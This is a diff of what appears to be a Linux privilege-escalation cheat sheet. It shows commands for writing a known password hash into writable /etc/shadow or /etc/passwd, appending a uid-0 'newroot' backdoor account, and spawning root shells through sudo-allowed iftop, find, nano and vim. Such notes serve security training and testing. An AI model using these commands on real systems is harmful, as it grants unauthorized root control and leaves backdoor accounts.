@@ -204,45 +204,79 @@ IMPORTANT FILES
 ## CATEGORY "WEAK FILE PERMESSIONS" - WRITEABLE /ETC/SHADOW
 ```
 ls -l /etc/shadow
-mkpasswd -m sha-512 newpasswordhere
-mkpasswd -m sha-512 test
+mkpasswd -m sha-512 test_password
 $6$RI8vxrmPWU0Xv$u4EgyPSgA7SLBs0O.ZUbYrbzavoP.B81ApAcQfBnz483l5Phrc.8HegjUZgvOoGL74h0NG0rlYZDhVkmKjzQs0
+nano /etc/shadow
+root:???????????????:17298:0:99999:7:::
 su root
-password: test
+password: test_password
 whoami && ifconfig
 ```
 
 ## CATEGORY "WEAK FILE PERMESSIONS" - WRITEABLE /ETC/PASSWD
 ```
 ls -l /etc/passwd
-openssl passwd newpasswordhere
-openssl passwd test
+openssl passwd test_password
 IgClDflgL8ROI
 nano /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+root:??????????????:0:0:root:/root:/bin/bash
+root:IgClDflgL8ROI:0:0:root:/root:/bin/bash
 su root
+```
+```
 echo 'newroot:IgClDflgL8ROI:0:0:root:/root:/bin/bash' >> /etc/passwd
+su newroot
 id
 whoami && ifconfig
 ```
 
 ## CATEGORY "SUDO" - SHELL ESCAPE BINARIES 
 ```
-https://gtfobins.github.io/gtfobins/iftop/
 https://gtfobins.github.io/
-IFTOP
 sudo -l 
+Matching Defaults entries for user on this host:
+    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
+
+User user may run the following commands on this host:
+    (root) NOPASSWD: /usr/sbin/iftop
+    (root) NOPASSWD: /usr/bin/find
+    (root) NOPASSWD: /usr/bin/nano
+    (root) NOPASSWD: /usr/bin/vim
+    (root) NOPASSWD: /usr/bin/man
+    (root) NOPASSWD: /usr/bin/awk
+    (root) NOPASSWD: /usr/bin/less
+    (root) NOPASSWD: /usr/bin/ftp
+    (root) NOPASSWD: /usr/bin/nmap
+    (root) NOPASSWD: /usr/sbin/apache2
+    (root) NOPASSWD: /bin/more
+```
+```
+IFTOP
 sudo iftop
 press shift + !
-bin/sh
-iftop exit: press escape , enter :q , enter 
+type /bin/sh
+exit iftop interface: 
+press escape , type :q , press enter 
+```
+```
 FIND
 sudo find . -exec /bin/sh \; -quit
+```
+```
 NANO
 sudo nano -s /bin/sh
-^R^X = cntr R and cntr X
-reset; sh 1>&0 2>&0 - means copy paste 
+press cntr R (^R)
+press cntr X (^R^X)
+type 
+reset; sh 1>&0 2>&0  
+```
+
+```
 VIM
 sudo vim -c ':!/bin/sh'
+```
+```
 SUID/SUDO
 --binary
 ----shell escape (GTO/Linpeas)
